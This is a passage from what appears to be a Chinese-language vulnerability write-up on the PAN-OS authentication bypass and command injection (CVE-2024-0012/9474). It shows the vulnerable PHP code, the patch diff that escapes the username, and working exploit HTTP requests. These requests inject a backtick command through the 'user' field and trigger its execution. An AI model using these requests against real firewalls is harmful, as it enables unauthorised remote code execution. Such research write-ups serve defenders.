class="comment">/** <span class="doctag">@noinspection</span> PhpUndefinedFunctionInspection */</span></span><br><span class="line"><span class="variable">$isCms</span> = <span class="title function_ invoke__">panui_platform_is_cms</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$isCms</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// create a remote appweb session only on a device</span></span><br><span class="line">    <span class="comment">// &#x27;vsys&#x27; is the list of accessible vsys for the user. If blank then it means all vsys</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$locale</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;locale&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;locale&#x27;</span>] : <span class="variable">$_SESSION</span>[<span class="string">&#x27;locale&#x27;</span>];</span><br><span class="line">    <span class="comment">/** <span class="doctag">@noinspection</span> PhpUndefinedFunctionInspection */</span></span><br><span class="line">    <span class="title function_ invoke__">panCreateRemoteAppwebSession</span>(</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;userRole&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;remoteHost&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;vsys&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;editShared&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;prot&#x27;</span>],</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;rbaxml&#x27;</span>],</span><br><span class="line">        <span class="variable">$locale</span>,</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;hideHeaderBg&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_write_close</span>();</span><br></pre></td></tr></table></figure>

<p>当创建好<code>sess_id</code>文件后，我们只需要使用这个<code>sessionid</code>即可触发漏洞代码写日志</p>
<h3 id="补丁分析-1"><a href="#补丁分析-1" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>对<code>$username</code>参数进行了过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">panui_core</span>\<span class="title class_">log</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_core</span>\<span class="title">InjectableClass</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_process</span>\<span class="title">Process</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">pan_process</span>\<span class="title">ShellSanitizer</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuditLog</span> <span class="keyword">extends</span> <span class="title">InjectableClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$message</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> ShellSanitizer */</span></span><br><span class="line">    <span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;ioc-&gt;<span class="title function_ invoke__">get</span>(<span class="title class_">ShellSanitizer</span>::<span class="variable language_">class</span>);</span><br><span class="line">    <span class="variable">$msg</span> = <span class="variable">$s</span>-&gt;<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$message</span>);</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Process */</span></span><br><span class="line">    <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;ioc-&gt;<span class="title function_ invoke__">get</span>(<span class="title class_">Process</span>::<span class="variable language_">class</span>);</span><br><span class="line">-    <span class="keyword">return</span> <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">pexecute</span>(<span class="string">&quot;/usr/local/bin/pan_elog -u audit -m <span class="subst">$msg</span> -o <span class="subst">$username</span>&quot;</span>);</span><br><span class="line">+    <span class="variable">$u</span> = <span class="variable">$s</span>-&gt;<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$username</span>);</span><br><span class="line">+    <span class="keyword">return</span> <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">pexecute</span>(<span class="string">&quot;/usr/local/bin/pan_elog -u audit -m <span class="subst">$msg</span> -o <span class="subst">$u</span>&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>控制变量</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /php/utils/createRemoteAppwebSession.php/k0mor3b1.js.map HTTP/1.1</span><br><span class="line">Host: 192.168.2.151</span><br><span class="line">X-PAN-AUTHCHECK: off</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 106</span><br><span class="line"></span><br><span class="line">user=`echo $(uname -a) &gt; /var/appweb/htdocs/unauth/k0mor3b1.php`&amp;userRole=superuser&amp;remoteHost=&amp;vsys=vsys1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sun, 16 Feb 2025 06:12:26 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 48</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Set-Cookie: PHPSESSID=837b0e3fu9bn9m05v4hip6ncdc; path=/; HttpOnly</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache; no-store</span><br><span class="line"></span><br><span class="line">@start@PHPSESSID=837b0e3fu9bn9m05v4hip6ncdc@end@</span><br></pre></td></tr></table></figure>

<p>命令执行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php/.js.map HTTP/1.1</span><br><span class="line">Host: 192.168.2.151</span><br><span class="line">Cookie: PHPSESSID=837b0e3fu9bn9m05v4hip6ncdc;</span><br><span class="line">X-PAN-AUTHCHECK: off</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>

<p><img src="/images/kYmM2YTYwYzViYmViODBkNDlmM11119" alt="img"></p>
<p><img src="/images/kYmM2YTYwYzViYmViODBkNDlmM11120" alt="img"></p>
<p><img src="/images/kYmM2YTYwYzViYmViODBkNDlmM121" alt="img"></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/">https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/</a></p>
<p><a target="_blank" rel="noopener" href="https://mirror.cloudpropeller.com/paloalto/vm-series/">https://mirror.cloudpropeller.com/paloalto/vm-series/</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/k0mor3b1">Projects</a></li>
        
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-0012"><span class="toc-number">1.</span> <span class="toc-text">CVE-2024-0012</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.2.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">1.5.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.6.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-9474"><span class="toc-number">2.</span> <span class="toc-text">CVE-2024-9474</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-1"><span class="toc-number">2.2.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90-1"><span class="toc-number">2.4.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.5.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.6.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&text=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&title=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&is_video=false&description=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE&body=Check out this article: http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&title=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&title=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&title=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&title=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&name=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/02/17/2025-02-17-CVE-2024-00129474%20PAN-OS%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87+RCE/&t=CVE-2024-0012/9474 PAN-OS 身份验证绕过+RCE"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    John Doe
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/k0mor3b1">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
